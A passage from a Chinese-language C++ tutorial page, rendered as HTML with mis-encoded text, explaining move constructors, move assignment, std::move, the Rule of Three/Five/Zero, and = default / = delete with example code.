size = other.size;</span><br><span class="line">        buffer = other.buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆä½†å¯ææ„çš„çŠ¶æ€</span></span><br><span class="line">        other.size = <span class="number">0</span>;</span><br><span class="line">        other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// æˆ–è€…ä½¿ç”¨ swap:</span></span><br><span class="line">        <span class="comment">// swap(*this, other);</span></span><br><span class="line">        <span class="comment">// return *this;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content: &quot;</span> &lt;&lt; (buffer ? buffer : <span class="string">&quot;null&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(ModernBuffer&amp; first, ModernBuffer&amp; second)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">         <span class="keyword">using</span> <span class="built_in">std</span>::swap;</span><br><span class="line">         swap(first.size, second.size);</span><br><span class="line">         swap(first.buffer, second.buffer);</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer swapped via friend swap\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">ModernBuffer <span class="title">createModernBuffer</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ModernBuffer(s); <span class="comment">// è¿”å›ä¸´æ—¶å¯¹è±¡ (rvalue)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">ModernBuffer <span class="title">mb1</span><span class="params">(<span class="string">&quot;Original&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•° (å› ä¸º createModernBuffer è¿”å›å³å€¼)</span></span><br><span class="line">    ModernBuffer mb2 = createModernBuffer(<span class="string">&quot;Temporary&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line">    mb2.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (å› ä¸º createModernBuffer è¿”å›å³å€¼)</span></span><br><span class="line">    mb1 = createModernBuffer(<span class="string">&quot;Another Temp&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line">    mb1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œå½“ç”¨ <code>createModernBuffer</code> è¿”å›çš„ä¸´æ—¶å¯¹è±¡æ¥åˆå§‹åŒ– <code>mb2</code> æˆ–èµ‹å€¼ç»™ <code>mb1</code> æ—¶ï¼Œä¼šè°ƒç”¨<strong>ç§»åŠ¨æ„é€ å‡½æ•°</strong>æˆ–<strong>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦</strong>ã€‚è¿™äº›æ“ä½œä¸å†è¿›è¡Œæ·±æ‹·è´ï¼Œè€Œæ˜¯ç›´æ¥â€œçªƒå–â€ä¸´æ—¶å¯¹è±¡çš„ <code>buffer</code> æŒ‡é’ˆï¼Œå¹¶å°†ä¸´æ—¶å¯¹è±¡çš„æŒ‡é’ˆç½®ä¸º <code>nullptr</code>ï¼Œé¿å…äº†å†…å­˜åˆ†é…å’Œæ•°æ®å¤åˆ¶ï¼Œæ•ˆç‡å¤§å¤§æé«˜ã€‚</p><h3 id="18-2-3-ç§»åŠ¨æ„é€ å‡½æ•°è§£æ"><a href="#18-2-3-ç§»åŠ¨æ„é€ å‡½æ•°è§£æ" class="headerlink" title="18.2.3 ç§»åŠ¨æ„é€ å‡½æ•°è§£æ"></a>18.2.3 ç§»åŠ¨æ„é€ å‡½æ•°è§£æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ModernBuffer(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span></span><br><span class="line">    : size(other.size), buffer(other.buffer) <span class="comment">// 1. çªƒå–èµ„æº</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 2. å°†æºå¯¹è±¡ç½®ç©º</span></span><br><span class="line">    other.size = <span class="number">0</span>;</span><br><span class="line">    other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li> <strong>å‚æ•°ç±»å‹ <code>ModernBuffer&amp;&amp; other</code>:</strong> æ¥æ”¶ä¸€ä¸ªå³å€¼å¼•ç”¨ï¼Œè¡¨ç¤ºå®ƒåªèƒ½ç»‘å®šåˆ°å³å€¼ï¼ˆå¦‚ä¸´æ—¶å¯¹è±¡ï¼‰ã€‚</li><li> <strong>èµ„æºçªƒå–:</strong> æ„é€ å‡½æ•°é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ç›´æ¥å¤åˆ¶æºå¯¹è±¡ <code>other</code> çš„æŒ‡é’ˆ <code>buffer</code> å’Œå¤§å° <code>size</code>ã€‚è¿™æ˜¯ä¸€ä¸ªæµ…æ‹·è´ï¼Œéå¸¸å¿«é€Ÿã€‚</li><li> <strong>ç½®ç©ºæºå¯¹è±¡:</strong> <strong>å…³é”®æ­¥éª¤ï¼</strong> å¿…é¡»å°†æºå¯¹è±¡ <code>other</code> çš„æŒ‡é’ˆæˆå‘˜ï¼ˆ<code>buffer</code>ï¼‰è®¾ç½®ä¸º <code>nullptr</code>ï¼ˆæˆ–å…¶ä»–æœ‰æ•ˆä½†è¡¨ç¤ºâ€œç©ºâ€çŠ¶æ€çš„å€¼ï¼‰ã€‚è¿™ç¡®ä¿äº†å½“ <code>other</code>ï¼ˆä¸´æ—¶å¯¹è±¡ï¼‰éšåè¢«ææ„æ—¶ï¼Œå®ƒçš„ææ„å‡½æ•° <code>delete[] buffer;</code> ä¸ä¼šé‡Šæ”¾å·²ç»è¢«æ–°å¯¹è±¡â€œçªƒå–â€èµ°çš„å†…å­˜ï¼Œä»è€Œé¿å…äº†<strong>é‡å¤é‡Šæ”¾ (double free)</strong> çš„é”™è¯¯ã€‚æºå¯¹è±¡å¿…é¡»è¢«ç½®äºä¸€ä¸ª<strong>æœ‰æ•ˆçš„ã€å¯ææ„çš„çŠ¶æ€</strong>ã€‚</li><li> <strong><code>noexcept</code>:</strong> ç§»åŠ¨æ“ä½œé€šå¸¸<strong>ä¸åº”è¯¥</strong>æŠ›å‡ºå¼‚å¸¸ï¼ˆå› ä¸ºå®ƒä»¬ä¸»è¦æ¶‰åŠæŒ‡é’ˆå’ŒåŸºæœ¬ç±»å‹çš„èµ‹å€¼ï¼‰ã€‚å°†ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦æ ‡è®°ä¸º <code>noexcept</code> éå¸¸é‡è¦ã€‚è¿™å…è®¸ STL å®¹å™¨ç­‰åœ¨éœ€è¦é‡æ–°åˆ†é…å†…å­˜æ—¶ï¼ˆå¦‚ <code>vector</code> å¢é•¿ï¼‰å®‰å…¨åœ°<strong>ç§»åŠ¨</strong>å…ƒç´ è€Œä¸æ˜¯å¤åˆ¶å®ƒä»¬ï¼Œä»è€Œè·å¾—æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚å¦‚æœç§»åŠ¨æ“ä½œå¯èƒ½æŠ›å¼‚å¸¸ï¼ŒSTL é€šå¸¸ä¼šå›é€€åˆ°ä½¿ç”¨ï¼ˆä¿è¯å¼‚å¸¸å®‰å…¨çš„ï¼‰å¤åˆ¶æ“ä½œã€‚</li></ol><h3 id="18-2-4-èµ‹å€¼"><a href="#18-2-4-èµ‹å€¼" class="headerlink" title="18.2.4 èµ‹å€¼"></a>18.2.4 èµ‹å€¼</h3><p>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦çš„é€»è¾‘ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ModernBuffer&amp; <span class="keyword">operator</span>=(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">    <span class="comment">// ... è‡ªèµ‹å€¼æ£€æŸ¥ ...</span></span><br><span class="line">    <span class="comment">// 1. é‡Šæ”¾å½“å‰èµ„æº</span></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="comment">// 2. çªƒå–æºèµ„æº</span></span><br><span class="line">    size = other.size;</span><br><span class="line">    buffer = other.buffer;</span><br><span class="line">    <span class="comment">// 3. ç½®ç©ºæºå¯¹è±¡</span></span><br><span class="line">    other.size = <span class="number">0</span>;</span><br><span class="line">    other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒé¦–å…ˆé‡Šæ”¾è‡ªå·±å½“å‰æŒæœ‰çš„èµ„æºï¼Œç„¶åçªƒå–æºå¯¹è±¡çš„èµ„æºï¼Œæœ€åå°†æºå¯¹è±¡ç½®ç©ºã€‚ä½¿ç”¨ <code>swap</code> å®ç°é€šå¸¸æ›´ç®€æ´ä¸”èƒ½è‡ªåŠ¨å¤„ç†è‡ªèµ‹å€¼å’Œå¼‚å¸¸å®‰å…¨ï¼ˆå¦‚æœ <code>swap</code> æ˜¯ <code>noexcept</code> çš„è¯ï¼‰ã€‚</p><h3 id="18-2-5-å¼ºåˆ¶ç§»åŠ¨-std-move"><a href="#18-2-5-å¼ºåˆ¶ç§»åŠ¨-std-move" class="headerlink" title="18.2.5 å¼ºåˆ¶ç§»åŠ¨ (std::move)"></a>18.2.5 å¼ºåˆ¶ç§»åŠ¨ (<code>std::move</code>)</h3><p>ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦é€šå¸¸åªå¯¹<strong>å³å€¼</strong>ï¼ˆå¦‚ä¸´æ—¶å¯¹è±¡ï¼‰èµ·ä½œç”¨ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬æƒ³ä»ä¸€ä¸ª<strong>å·¦å€¼</strong>ï¼ˆæœ‰åå­—çš„å¯¹è±¡ï¼‰é‚£é‡Œâ€œçªƒå–â€èµ„æºï¼Œå³ä½¿è¿™ä¸ªå·¦å€¼åœ¨ä¹‹åè¿˜ä¼šå­˜åœ¨ï¼ˆä½†æˆ‘ä»¬æ˜ç¡®çŸ¥é“ä¸å†éœ€è¦å®ƒçš„èµ„æºäº†ï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªå¤§çš„ <code>vector</code> çš„å†…å®¹è½¬ç§»ç»™å¦ä¸€ä¸ª <code>vector</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; source = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; destination;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destination = source; // è¿™ä¼šè°ƒç”¨å¤åˆ¶èµ‹å€¼ï¼Œå¤åˆ¶æ‰€æœ‰å…ƒç´ </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä»¬æƒ³ç§»åŠ¨ source çš„å†…å®¹åˆ° destinationï¼Œå³ä½¿ source æ˜¯å·¦å€¼</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ std::move() å°† source å¼ºåˆ¶è½¬æ¢ä¸ºå³å€¼å¼•ç”¨ç±»å‹</span></span><br><span class="line">destination = <span class="built_in">std</span>::move(source);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç°åœ¨ï¼Œdestination æ‹¥æœ‰äº†åŸæ¥çš„å…ƒç´  &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line"><span class="comment">// source çš„çŠ¶æ€æ˜¯æœ‰æ•ˆçš„ï¼Œä½†å†…å®¹æœªæŒ‡å®š (é€šå¸¸ä¸ºç©º)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Source size after move: &quot;</span> &lt;&lt; source.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€šå¸¸è¾“å‡º 0</span></span><br></pre></td></tr></table></figure><p><code>std::move</code> (å®šä¹‰åœ¨ <code>&lt;utility&gt;</code>) æœ¬èº«<strong>å¹¶ä¸æ‰§è¡Œä»»ä½•ç§»åŠ¨æ“ä½œ</strong>ã€‚å®ƒåªæ˜¯ä¸€ä¸ª<strong>ç±»å‹è½¬æ¢</strong>ï¼Œå®ƒæ— æ¡ä»¶åœ°å°†å…¶å®å‚ï¼ˆæ— è®ºæ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼ï¼‰è½¬æ¢ä¸º<strong>å³å€¼å¼•ç”¨ç±»å‹</strong> (<code>T&amp;&amp;</code>)ã€‚</p><p>è¿™ä¸ªè½¬æ¢ä½¿å¾—è¢«è½¬æ¢çš„å¯¹è±¡å¯ä»¥è¢«ç»‘å®šåˆ°æ¥å—å³å€¼å¼•ç”¨çš„å‡½æ•°ï¼ˆå¦‚ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œä»è€Œ<strong>è§¦å‘</strong>ç§»åŠ¨è¯­ä¹‰ã€‚</p><p><strong>ä½¿ç”¨ <code>std::move</code> çš„æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  è°ƒç”¨ <code>std::move(x)</code> åï¼Œä½ ä¸åº”è¯¥å†å¯¹ <code>x</code> çš„å€¼åšä»»ä½•å‡è®¾ï¼ˆé™¤äº†å®ƒå¯ä»¥è¢«å®‰å…¨åœ°é”€æ¯æˆ–é‡æ–°èµ‹å€¼ï¼‰ã€‚å®ƒçš„èµ„æºå¯èƒ½å·²ç»è¢«â€œå·èµ°â€äº†ã€‚</li><li>  åªåœ¨ä½ ç¡®å®šä¸å†éœ€è¦æºå¯¹è±¡ï¼ˆå·¦å€¼ï¼‰çš„èµ„æºï¼Œæˆ–è€…æºå¯¹è±¡æœ¬èº«å°±æ˜¯ä¸´æ—¶çš„ï¼ˆè™½ç„¶å¯¹ä¸´æ—¶å¯¹è±¡ç”¨ <code>std::move</code> é€šå¸¸æ˜¯å¤šä½™çš„ï¼‰æ—¶ï¼Œæ‰ä½¿ç”¨ <code>std::move</code>ã€‚</li></ul><p>ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨æ˜¯ C++11 ä¸­å®ç°èµ„æºé«˜æ•ˆè½¬ç§»çš„å…³é”®æœºåˆ¶ï¼Œå¯¹äºç¼–å†™é«˜æ€§èƒ½çš„ C++ ä»£ç è‡³å…³é‡è¦ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®ç»“æ„æˆ–ç®¡ç†ç³»ç»Ÿèµ„æºæ—¶ã€‚</p><h2 id="18-3-æ–°çš„ç±»åŠŸèƒ½"><a href="#18-3-æ–°çš„ç±»åŠŸèƒ½" class="headerlink" title="18.3 æ–°çš„ç±»åŠŸèƒ½"></a>18.3 æ–°çš„ç±»åŠŸèƒ½</h2><p>C++11 ä¸ä»…å¼•å…¥äº†ç§»åŠ¨è¯­ä¹‰ï¼Œè¿˜å¯¹ç±»çš„å®šä¹‰å’Œä½¿ç”¨æ–¹å¼è¿›è¡Œäº†ä¸€äº›é‡è¦çš„å¢å¼ºï¼Œä½¿å¾—ç±»çš„è®¾è®¡æ›´åŠ çµæ´»å’Œå¯æ§ã€‚</p><h3 id="18-3-1-ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°"><a href="#18-3-1-ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°" class="headerlink" title="18.3.1 ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°"></a>18.3.1 ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°</h3><p>å¯¹äºä¸€ä¸ªç±»ï¼Œç¼–è¯‘å™¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯ä»¥è‡ªåŠ¨ç”Ÿæˆä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼š</p><ol><li> <strong>é»˜è®¤æ„é€ å‡½æ•° (Default Constructor):</strong> å¦‚æœä½ æ²¡æœ‰æä¾›ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚</li><li> <strong>ææ„å‡½æ•° (Destructor):</strong> å¦‚æœä½ æ²¡æœ‰æä¾›ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚</li><li> <strong>å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor):</strong> å¦‚æœä½ æ²¡æœ‰æä¾›å¤åˆ¶æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªï¼Œæ‰§è¡Œé€æˆå‘˜å¤åˆ¶ã€‚</li><li> <strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator):</strong> å¦‚æœä½ æ²¡æœ‰æä¾›å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªï¼Œæ‰§è¡Œé€æˆå‘˜èµ‹å€¼ã€‚</li><li> <strong>ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11):</strong> ä»…å½“<strong>æ²¡æœ‰</strong>æ˜¾å¼å£°æ˜ä»»ä½•å¤åˆ¶æ“ä½œï¼ˆå¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ï¼‰<strong>ä¸”æ²¡æœ‰</strong>æ˜¾å¼å£°æ˜ç§»åŠ¨æ“ä½œï¼ˆç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰<strong>ä¸”æ²¡æœ‰</strong>æ˜¾å¼å£°æ˜ææ„å‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šç”Ÿæˆã€‚å®ƒæ‰§è¡Œé€æˆå‘˜ç§»åŠ¨ã€‚</li><li> <strong>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11):</strong> ç”Ÿæˆæ¡ä»¶ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ã€‚å®ƒæ‰§è¡Œé€æˆå‘˜ç§»åŠ¨ã€‚</li></ol><p><strong>è§„åˆ™æ€»ç»“ (Rule of Three/Five/Zero):</strong></p><ul><li>  <strong>Rule of Three (C++98):</strong> å¦‚æœä½ éœ€è¦æ˜¾å¼å®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„<strong>ä»»ä½•ä¸€ä¸ª</strong>ï¼ˆé€šå¸¸æ˜¯å› ä¸ºç±»ç®¡ç†äº†éœ€è¦æ·±æ‹·è´æˆ–ç‰¹æ®Šæ¸…ç†çš„èµ„æºï¼‰ï¼Œé‚£ä¹ˆä½ <strong>å‡ ä¹è‚¯å®š</strong>éœ€è¦åŒæ—¶å®šä¹‰è¿™ä¸‰ä¸ªã€‚</li><li>  <strong>Rule of Five (C++11):</strong> å¦‚æœä½ éœ€è¦æ˜¾å¼å®šä¹‰ä¸Šè¿°ä¸‰ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œæˆ–è€…æ˜¾å¼å®šä¹‰äº†ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼Œé‚£ä¹ˆä½ åº”è¯¥è€ƒè™‘å®šä¹‰æˆ–åˆ é™¤ (delete) <strong>æ‰€æœ‰äº”ä¸ª</strong>ï¼ˆææ„ã€å¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ã€ç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰ï¼Œä»¥ç¡®ä¿ç±»çš„è¡Œä¸ºç¬¦åˆé¢„æœŸã€‚å› ä¸ºæ˜¾å¼å®šä¹‰ä»»ä½•ä¸€ä¸ªå¤åˆ¶/ç§»åŠ¨/ææ„å‡½æ•°éƒ½ä¼šé˜»æ­¢ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆç§»åŠ¨æ“ä½œã€‚</li><li>  <strong>Rule of Zero (ç°ä»£ C++ æ¨è):</strong> å°½é‡è®¾è®¡ä½ çš„ç±»ï¼Œä½¿å…¶<strong>ä¸éœ€è¦</strong>è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–å¤åˆ¶/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚è¿™é€šå¸¸é€šè¿‡ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™å’Œä¾èµ–æ ‡å‡†åº“ç»„ä»¶ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ <code>unique_ptr</code>, <code>shared_ptr</code> å’Œå®¹å™¨ <code>vector</code>, <code>string</code>ï¼‰æ¥å®ç°ï¼Œè¿™äº›ç»„ä»¶å·²ç»æ­£ç¡®åœ°å¤„ç†äº†èµ„æºçš„å¤åˆ¶ã€ç§»åŠ¨å’Œé‡Šæ”¾ã€‚å¦‚æœéµå¾ª Rule of Zeroï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬é€šå¸¸å°±èƒ½æ­£å¸¸å·¥ä½œã€‚</li></ul><h3 id="18-3-2-é»˜è®¤çš„æ–¹æ³•å’Œç¦ç”¨çš„æ–¹æ³•-default-delete"><a href="#18-3-2-é»˜è®¤çš„æ–¹æ³•å’Œç¦ç”¨çš„æ–¹æ³•-default-delete" class="headerlink" title="18.3.2 é»˜è®¤çš„æ–¹æ³•å’Œç¦ç”¨çš„æ–¹æ³• (= default, = delete)"></a>18.3.2 é»˜è®¤çš„æ–¹æ³•å’Œç¦ç”¨çš„æ–¹æ³• (<code>= default</code>, <code>= delete</code>)</h3><p>C++11 å…è®¸ä½ æ›´æ˜ç¡®åœ°æ§åˆ¶ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„ç”Ÿæˆï¼š</p><ul><li><p><strong><code>= default</code>:</strong> æ˜¾å¼åœ°å‘Šè¯‰ç¼–è¯‘å™¨ç”Ÿæˆè¯¥ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„<strong>é»˜è®¤å®ç°</strong>ã€‚å³ä½¿å› ä¸ºä½ å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°æˆ–ç§»åŠ¨æ“ä½œè€Œå¯¼è‡´ç¼–è¯‘å™¨åŸæœ¬ä¸ä¼šç”Ÿæˆå®ƒï¼Œ<code>= default</code> ä¹Ÿå¯ä»¥å¼ºåˆ¶ç”Ÿæˆé»˜è®¤ç‰ˆæœ¬ï¼ˆå¦‚æœå¯èƒ½çš„è¯ï¼‰ã€‚è¿™å¯¹äºå¸Œæœ›æ‹¥æœ‰é»˜è®¤è¡Œä¸ºä½†åˆéœ€è¦è‡ªå®šä¹‰å…¶ä»–æ„é€ å‡½æ•°çš„æƒ…å†µå¾ˆæœ‰ç”¨ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassDefault</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClassDefault(<span class="keyword">int</span> val) : data(val) &#123;&#125; <span class="comment">// è‡ªå®šä¹‰æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å³ä½¿å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°ï¼Œä»æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    MyClassDefault() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    MyClassDefault(<span class="keyword">const</span> MyClassDefault&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// ... å…¶ä»–ç‰¹æ®Šæˆå‘˜å‡½æ•°ä¹Ÿå¯ä»¥ = default</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>= delete</code>:</strong> æ˜¾å¼åœ°<strong>ç¦ç”¨</strong>æŸä¸ªæˆå‘˜å‡½æ•°ï¼ˆå¯ä»¥æ˜¯ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯æ™®é€šæˆå‘˜å‡½æ•°ï¼‰ã€‚å¦‚æœä»£ç å°è¯•è°ƒç”¨è¢« <code>= delete</code> çš„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚è¿™å¸¸ç”¨äºé˜»æ­¢å¯¹è±¡çš„å¤åˆ¶æˆ–é˜²æ­¢ä¸æœŸæœ›çš„ç±»å‹è½¬æ¢ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for unique_ptr</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonCopyable</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    NonCopyable() = <span 